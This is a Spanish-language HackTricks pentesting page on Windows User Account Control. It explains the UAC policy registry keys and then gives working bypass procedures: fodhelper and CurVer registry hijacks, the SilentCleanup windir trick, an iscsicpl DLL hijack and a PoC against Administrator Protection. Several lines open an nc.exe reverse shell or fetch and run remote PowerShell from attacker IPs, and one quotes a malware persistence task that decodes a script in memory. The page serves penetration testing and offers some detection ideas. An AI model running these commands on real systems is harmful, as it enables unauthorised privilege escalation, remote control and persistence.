# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que habilita un **aviso de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta que no es de administrador**, a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso de nivel administrador al sistema para ejecutarse. Es una función práctica que protege a los administradores frente a cambios no intencionados, pero no se considera un límite de seguridad.<sup>[[2]](#references)</sup>

Para obtener más información sobre los niveles de integridad:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está implementado, un usuario administrador recibe 2 tokens: un token de usuario estándar, para realizar acciones habituales con integridad media, y otro con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC.<sup>[[2]](#references)</sup> Los administradores pueden utilizar políticas de seguridad para configurar cómo funciona UAC según las necesidades específicas de su organización a nivel local (mediante secpol.msc), o configurarlo y distribuirlo mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. Las distintas configuraciones se explican detalladamente [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona información adicional:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deshabilitado)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Solicitar consentimiento para binarios que no sean de Windows en el escritorio seguro) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Solicitar credenciales en el escritorio seguro)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Habilitado; deshabilitado de forma predeterminada en Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deshabilitado)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Habilitado)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Habilitado)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deshabilitado)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Habilitado)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Habilitado)                                              |

### Políticas para instalar software en Windows

Las **políticas de seguridad locales** ("secpol.msc" en la mayoría de los sistemas) están configuradas de forma predeterminada para **impedir que los usuarios que no son administradores realicen instalaciones de software**. Esto significa que, aunque un usuario que no sea administrador pueda descargar el instalador de tu software, no podrá ejecutarlo sin una cuenta de administrador.

### Claves del Registro para obligar a UAC a solicitar elevación

Como usuario estándar sin derechos de administrador, puedes asegurarte de que la cuenta "estándar" **reciba una solicitud de credenciales de UAC** cuando intente realizar determinadas acciones. Esta acción requeriría modificar determinadas **claves del Registro**, para lo cual necesitas permisos de administrador, a menos que exista un **UAC bypass**, o que el atacante ya haya iniciado sesión como administrador.

Aunque el usuario pertenezca al grupo **Administrators**, estos cambios obligan al usuario a **volver a introducir las credenciales de su cuenta** para realizar acciones administrativas.

**En la práctica, esto solo resulta útil cuando ya tienes un token elevado, un UAC bypass o una configuración incorrecta que te permite modificar estas claves; de lo contrario, la propia escritura en el Registro queda bloqueada.**

Las claves y entradas del Registro que debes modificar son las siguientes (con sus valores predeterminados entre paréntesis):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Esto también puede hacerse manualmente mediante la herramienta Local Security Policy. Una vez modificadas, las operaciones administrativas solicitan al usuario que vuelva a introducir sus credenciales.

### Nota

**User Account Control no es un límite de seguridad.** Por lo tanto, los usuarios estándar no pueden escapar de sus cuentas ni obtener derechos de administrador sin un exploit de escalada de privilegios local.

### Solicitar "acceso total al equipo" a un usuario
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegios de UAC

- Internet Explorer Protected Mode utiliza comprobaciones de integridad para impedir que los procesos con un nivel de integridad alto (como los navegadores web) accedan a datos con un nivel de integridad bajo (como la carpeta de archivos temporales de Internet). Esto se hace ejecutando el navegador con un token de baja integridad. Cuando el navegador intenta acceder a datos almacenados en la zona de baja integridad, el sistema operativo comprueba el nivel de integridad del proceso y permite el acceso según corresponda. Esta función ayuda a evitar que los ataques de ejecución remota de código obtengan acceso a datos confidenciales del sistema.
- Cuando un usuario inicia sesión en Windows, el sistema crea un token de acceso que contiene una lista de los privilegios del usuario. Los privilegios se definen como la combinación de los derechos y las capacidades de un usuario. El token también contiene una lista de las credenciales del usuario, que son las credenciales utilizadas para autenticar al usuario en el equipo y en los recursos de la red.

### Autoadminlogon

Para configurar Windows de modo que inicie sesión automáticamente con un usuario específico durante el arranque, establece la **`AutoAdminLogon` registry key**. Esto resulta útil en entornos de kiosco o con fines de prueba. Utiliza esta opción únicamente en sistemas seguros, ya que expone la contraseña en el registro.

Establece las siguientes claves mediante el Editor del Registro o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para volver al comportamiento normal de inicio de sesión, establece `AutoAdminLogon` en 0.

## UAC bypass

> [!TIP]
> Ten en cuenta que, si tienes acceso gráfico a la víctima, UAC bypass es sencillo, ya que solo tienes que hacer clic en "Sí" cuando aparezca el aviso de UAC.

UAC bypass es necesario en la siguiente situación: **UAC está activado, tu proceso se ejecuta en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil realizar UAC bypass si se encuentra en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### Triage rápido desde un shell de integridad media

Antes de intentar un bypass, confirma que estás en el escenario correcto y relaciona la build del host con métodos conocidos que funcionan:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notas prácticas:
- Si `EnableLUA=0`, no necesitas un bypass: cualquier token de administrador puede solicitar directamente alta integridad.
- `ConsentPromptBehaviorAdmin=2` o `5` es el escenario común para bypasses de auto-elevate / basados en COM.
- `Always Notify` eleva el nivel de dificultad, pero aun así debes probar la build exacta en lugar de asumir que fallará: UACME todavía registra algunos métodos `AlwaysNotify compatible` en las builds modernas de Windows.<sup>[[3]](#references)</sup>

### UAC deshabilitado

Si UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar un reverse shell con privilegios de administrador** (nivel de alta integridad) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** básico UAC "bypass" (acceso completo al sistema de archivos)

Si tienes un shell con un usuario que pertenece al grupo Administrators, puedes **mount el recurso compartido C$** mediante SMB (sistema de archivos) de forma local en un disco nuevo y tendrás **acceso a todo lo que hay dentro del sistema de archivos** (incluso a la carpeta de inicio de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

The Cobalt Strike techniques solo funcionarán si UAC no está configurado en su nivel máximo de seguridad
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** del **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Los objetos COM autoelevados siguen siendo una superficie práctica de UAC en las builds modernas. `ICMLuaUtil` todavía aparece en UACME como funcional en las ramas actuales de Windows, y las herramientas ofensivas continúan adaptando `CMSTPLUA` combinando un proceso de escritorio interactivo, ejecución de 64 bits y, en ocasiones, masquerading del PEB/proceso antes de invocar el COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consejos prácticos:
- Prefiere un proceso de **64 bits** en la **sesión interactiva** del usuario (normalmente `explorer.exe` o un proceso hijo).
- Si un shell sin más falla, vuelve a intentarlo desde un BOF / implementación de UACME en lugar de un wrapper ingenuo de `CreateProcess`.
- Espera que la ejecución del proceso hijo tenga lugar en un **proceso elevado separado**; muchos BOF no elevan el beacon actual directamente.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME** ](https://github.com/hfiref0x/UACME), que es una **compilación** de varios exploits de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando Visual Studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`); necesitarás saber **cuál necesitas.**\
Debes **tener cuidado**, porque algunos bypasses **mostrarán avisos de otros programas** que **alertarán** al **usuario** de que algo está ocurriendo.<sup>[[3]](#references)</sup>

UACME incluye la **build a partir de la cual cada técnica comenzó a funcionar**.<sup>[[3]](#references)</sup> Puedes buscar una técnica que afecte a tus versiones:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página obtienes la versión de Windows `1607` a partir de las versiones de compilación.

Un flujo de trabajo práctico consiste en **evaluar primero la compilación del host** y solo después ejecutar el método correspondiente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compara rápidamente la compilación local con sus métodos UAC conocidos, lo que resulta útil para descartar rápidamente los PoC obsoletos.<sup>[[4]](#references)</sup>
- `UACME` sigue siendo el mejor catálogo público para asociar un bypass con una compilación concreta. Las versiones recientes añadieron nuevos métodos y volvieron a probar los existentes en **Windows 11 25H2**, así que revisa de nuevo el README y las notas de la versión antes de asumir que una publicación antigua de un blog sigue siendo aplicable sin cambios.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se autoeleva en las versiones modernas de Windows. Al iniciarse, consulta la siguiente ruta del registro por usuario sin validar el verbo `DelegateExecute`. Colocar allí un comando permite que un proceso con integridad Medium (el usuario pertenece a Administrators) inicie un proceso con integridad High sin mostrar un aviso de UAC.

Ruta del registro consultada por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Pasos de PowerShell (configura tu payload y luego actívalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es default/lenient (no Always Notify con restricciones adicionales).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits.
- El Payload puede ser cualquier comando (PowerShell, cmd o una ruta a un EXE). Evita las interfaces que soliciten interacción para mantener el sigilo.

#### Variante de hijacking de CurVer/extensión (solo HKCU)

Muestras recientes que abusan de `fodhelper.exe` evitan `DelegateExecute` y, en su lugar, **redirigen el ProgID `ms-settings`** mediante el valor `CurVer` por usuario. El binario auto-elevado todavía resuelve el handler bajo `HKCU`, por lo que no se necesita un token de administrador para plantar las claves:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una vez elevado, el **malware** suele **deshabilitar las solicitudes futuras** estableciendo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` en `0`, y después realiza evasión de defensas adicional (por ejemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) y recrea la persistencia para ejecutarse con alta integridad. Una tarea de persistencia típica almacena en el disco un **script de PowerShell cifrado con XOR** y lo descodifica y ejecuta en memoria cada hora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante sigue limpiando el dropper y deja únicamente los payloads staged, por lo que la detección depende de monitorizar el **hijack de `CurVer`**, la manipulación de `ConsentPromptBehaviorAdmin`, la creación de exclusiones de Defender o las tareas programadas que descifran PowerShell en memoria.<sup>[[5]](#references)</sup>

### Evasión de UAC mediante la tarea `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` con privilegios máximos y expande `%windir%` desde el entorno del usuario. Si controlas `HKCU\Environment\windir`, puedes redirigir esa expansión a un comando arbitrario y obtener alta integridad sin un cuadro de diálogo de consentimiento.<sup>[[8]](#references)</sup> Este método todavía merece probarse en compilaciones recientes porque UACME mantiene la técnica activa, y el seguimiento reciente de incidencias indica que Windows 11 24H2 podría requerir únicamente pequeños ajustes de comillas.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Si la tarea cita la ruta en ese build, vuelve a intentarlo con el payload terminando en una comilla (por ejemplo, `cmd.exe"`). Limpia siempre `HKCU\Environment\windir` después de realizar las pruebas.

#### Más bypass de UAC

Muchos bypasses clásicos de UAC que abusan de flujos de UI, objetos COM o interacción con el escritorio requieren una **sesión interactiva completa** con la víctima; una shell común de `nc.exe` o un servicio ejecutándose en la **Session 0** a menudo no es suficiente.

A menudo puedes resolverlo usando una sesión de **meterpreter**. Migra a un **process** que tenga el valor de **Session** igual a **1**:

![Apunta ms-settings a una extensión personalizada (.thm) y asigna esa extensión a nuestro payload - Más bypass de UAC: Puedes conseguirlo usando una sesión de meterpreter. Migra a un proceso que tenga el valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tienes acceso a una **GUI**, simplemente puedes aceptar el aviso de UAC cuando aparezca; realmente no necesitas un bypass técnico. Por lo tanto, obtener una sesión GUI suele ser suficiente para evitar la fricción práctica añadida por UAC.

Además, si obtienes una sesión GUI que alguien estaba utilizando (potencialmente mediante RDP), habrá **algunas herramientas ejecutándose como administrador** desde las que podrías **ejecutar** un **cmd**, por ejemplo **como administrador**, directamente sin que UAC vuelva a solicitar confirmación, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **stealthy**.

### Bypass de UAC mediante fuerza bruta ruidosa

Si no te preocupa hacer ruido, siempre puedes **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), que **solicita elevar los permisos hasta que el usuario lo acepta**.

### Tu propio bypass - Metodología básica de bypass de UAC

Si echas un vistazo a **UACME**, notarás que **muchos bypasses de UAC abusan del DLL hijacking** (a menudo haciendo que un binario elevado cargue una DLL controlada por el atacante desde una ruta con permisos de escritura). [Lee esto para aprender a encontrar una vulnerabilidad de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que se **autoelevate** (comprueba que, al ejecutarlo, se ejecute con un nivel de integridad alto).
2. Con Procmon, busca eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente tendrás que **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32), donde no tienes permisos de escritura. Puedes evitarlo usando:
1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta con un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en observar si un **binario autoElevated** intenta **leer** del **registry** el **nombre/ruta** de un **binario** o **comando** que se va a **ejecutar** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

### Bypass de UAC mediante `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` del usuario

El binario de 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` tiene **auto-elevación** y puede abusarse de él para cargar `iscsiexe.dll` mediante el orden de búsqueda. Si puedes colocar una `iscsiexe.dll` maliciosa dentro de una carpeta **escribible por el usuario** y modificar después el `PATH` del usuario actual (por ejemplo, mediante `HKCU\Environment\Path`) para que se busque esa carpeta, Windows podría cargar la DLL del atacante dentro del proceso elevado de `iscsicpl.exe` **sin mostrar un aviso de UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notas prácticas:
- Esto resulta útil cuando el usuario actual pertenece a **Administrators**, pero se ejecuta con **Medium Integrity** debido a UAC.
- La copia de **SysWOW64** es la relevante para este bypass. Trata la copia de **System32** como un binario independiente y valida su comportamiento por separado.
- La primitiva es una combinación de **auto-elevación** y **DLL search-order hijacking**, por lo que el mismo flujo de trabajo de ProcMon utilizado para otros bypasses de UAC resulta útil para validar la carga de la DLL ausente.

Flujo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideas de detección:
- Generar una alerta ante `reg add` / escrituras en el registro en `HKCU\Environment\Path` seguidas inmediatamente de la ejecución de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Buscar `iscsiexe.dll` en ubicaciones **controladas por el usuario**, como `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacionar los lanzamientos de `iscsicpl.exe` con procesos secundarios inesperados o cargas de DLL desde fuera de los directorios normales de Windows.

### Investigaciones más recientes que conviene comprobar por separado

Algunas cadenas posteriores a 2024 ya no se parecen a los clásicos registry hijacks de `HKCU\Software\Classes`. Por ejemplo, el envenenamiento de la caché del contexto de activación puede encadenar un **drive remap** y una **DLL redirection** para pasar de integridad media a integridad alta mediante UI confiadas / binarios auto-elevated como `ctfmon.exe` y objetivos posteriores como `fodhelper.exe`. En lugar de duplicar aquí el PoC completo, consulta los ejemplos compactos de payload en:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### **Administrator Protection (25H2)**: drive-letter hijack mediante el mapa de dispositivos DOS por sesión de inicio de sesión

Para conocer toda la superficie de ataque de `RAiLaunchAdminProcess` / UIAccess en Windows 11 25H2, consulta la página específica:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” utiliza shadow-admin tokens con mapas `\Sessions\0\DosDevices/<LUID>` por sesión. El directorio se crea de forma diferida mediante `SeGetTokenDeviceMap` en la primera resolución de `\??`. Si el atacante suplanta el shadow-admin token únicamente con el nivel **SecurityIdentification**, el directorio se crea con el atacante como **propietario** (hereda `CREATOR OWNER`), lo que permite crear enlaces de letras de unidad que tienen prioridad sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Pasos:**

1. Desde una sesión con pocos privilegios, llama a `RAiProcessRunOnce` para iniciar un `runonce.exe` shadow-admin sin prompt.
2. Duplica su primary token para crear un token de **identificación** y suplántalo mientras abres `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo la propiedad del atacante.
3. Crea allí un symlink `C:` que apunte a almacenamiento controlado por el atacante; los accesos posteriores al sistema de archivos en esa sesión resolverán `C:` hacia la ruta del atacante, lo que permitirá un DLL/file hijack sin prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencias

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cómo funciona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Colección de técnicas de bypass de UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner y launcher de compatibilidad para bypass de UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Explotación de 0-Day contra objetivos gubernamentales del sudeste asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass de UAC mediante la tarea SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
